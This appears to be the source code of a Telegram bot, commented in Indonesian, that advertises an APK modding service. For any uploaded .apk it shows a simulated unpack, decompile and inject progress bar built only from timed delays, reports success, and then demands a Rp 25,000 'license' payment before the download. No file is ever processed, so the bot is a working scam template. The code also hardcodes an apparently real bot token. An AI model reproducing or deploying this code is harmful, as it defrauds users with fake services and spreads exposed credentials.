const { Telegraf, Markup } = require('telegraf');
const express = require('express');

// MASUKKAN TOKEN BOTFAHER LO DI SINI
const bot = new Telegraf('8871741160:AAH8cOnFnFjIcZFSb1WqbESm0F8aIHxTdSk');

// 1. Trigger /start
bot.start((ctx) => {
    const namaUser = ctx.from.first_name || 'User';
    ctx.reply(
        `Halo ${namaUser}! Selamat datang di SyntaxApp Modding Tools.\nSilakan pilih bahasa Anda / Please select your language:`,
        Markup.inlineKeyboard([
            [
                Markup.button.callback('🇮🇩 Bahasa Indonesia', 'lang_id'),
                Markup.button.callback('🇬🇧 English', 'lang_en')
            ]
        ])
    );
});

// 2. Handler Pilihan Bahasa (Tombol langsung hilang, muncul Menu Mod)
bot.action(['lang_id', 'lang_en'], async (ctx) => {
    await ctx.answerCbQuery();
    const isIndo = ctx.callbackQuery.data === 'lang_id';
    
    // Hapus pesan tombol bahasa biar chat bersih
    try { await ctx.deleteMessage(); } catch (e) {}

    const textMenu = isIndo 
        ? "⚡ **SYNTAXAPP TOOLS v1.0** ⚡\n\nSilakan kirimkan file (.apk) yang ingin Anda modifikasi ke sini. Sistem akan otomatis melakukan:\n• 📦 Unpack & Decompile APK\n• 🛠️ Create Mod Menu Environment"
        : "⚡ **SYNTAXAPP TOOLS v1.0** ⚡\n\nOptional: Please send the (.apk) file you want to modify here. The system will automatically perform:\n• 📦 Unpack & Decompile APK\n• 🛠️ Create Mod Menu Environment";

    ctx.replyWithMarkdown(textMenu);
});

// 3. Otomatis Detect File APK + Simulasi Progress Bar
bot.on('document', async (ctx) => {
    const fileName = ctx.message.document.file_name;
    
    // Cek apakah file yang dikirim ber-ekstensi .apk
    if (!fileName.endsWith('.apk')) {
        return ctx.reply('❌ File harus berformat .apk, Bro! Silakan coba kirim ulang.');
    }

    // Pesan awal progress bar
    const progressMsg = await ctx.reply('📥 [ ] 0% - Mengunduh file APK...');

    // Fungsi pembantu buat animasi progress bar (Sekbar)
    const delay = (ms) => new Promise(res => setTimeout(res, ms));

    await delay(1200);
    await ctx.telegram.editMessageText(ctx.chat.id, progressMsg.message_id, null, '📦 [██░░░░░░░░] 20% - Unpacking APK resources...');
    
    await delay(1500);
    await ctx.telegram.editMessageText(ctx.chat.id, progressMsg.message_id, null, '🔍 [█████░░░░░] 50% - Decompiling dex & inject code...');
    
    await delay(1500);
    await ctx.telegram.editMessageText(ctx.chat.id, progressMsg.message_id, null, '🛠️ [████████░░] 80% - Creating Custom Mod Environment...');
    
    await delay(1200);
    await ctx.telegram.editMessageText(ctx.chat.id, progressMsg.message_id, null, '✨ [██████████] 100% - Sukses! Modifikasi Selesai.');

    // 4. Muncul Sukses, Button Download, dan Trigger List Pembayaran saat diklik
    await ctx.reply(
        `✅ **PROSES BERHASIL!**\n\nFile \`${fileName}\` telah berhasil di-Unpack dan di-rebuild dengan sistem Cmod terbaru. Silakan klik tombol di bawah untuk mengunduh.`,
        {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard([
                [Markup.button.callback('📥 Download APK Mod', 'trigger_payment')]
            ])
        }
    );
});

// 5. Handler saat tombol Download diklik -> Muncul Detail List Pembayaran
bot.action('trigger_payment', async (ctx) => {
    await ctx.answerCbQuery();
    
    const textPayment = 
        `💳 **FORM PEMBAYARAN & AKTIVASI LISENSI**\n\n` +
        `Untuk mengunduh output build APK Mod, silakan selesaikan pembayaran lisensi alat sebesar:\n` +
        `💰 **Rp 25.000,-**\n\n` +
        `**Metode Pembayaran Tersedia:**\n` +
        `• 🏛️ Bank Transfer (Virtual Account / Debit)\n` +
        `• 📱 E-Wallet (DANA / OVO / GoPay)\n\n` +
        `*Silakan hubungi administrator setelah melakukan transfer untuk mendapatkan key aktivasi download.*`;

    ctx.replyWithMarkdown(
        textPayment,
        Markup.inlineKeyboard([
            [Markup.button.url('💬 Hubungi Admin / Bayar', 'https://t.me/BotFather')] // Ganti pakai link telegram lo pribadi nanti
        ])
    );
});

const app = express();
const VERCEL_URL = 'https://bot-telegram-bahasa.vercel.app'; 

app.use(bot.webhookCallback('/api/telegram'));
bot.telegram.setWebhook(`${VERCEL_URL}/api/telegram`)
    .then(() => console.log('Webhook Terpasang!'))
    .catch((err) => console.error('Gagal pasang webhook:', err));

app.get('/', (req, res) => {
    res.send('Bot Online 24 Jam!');
});

module.exports = app;
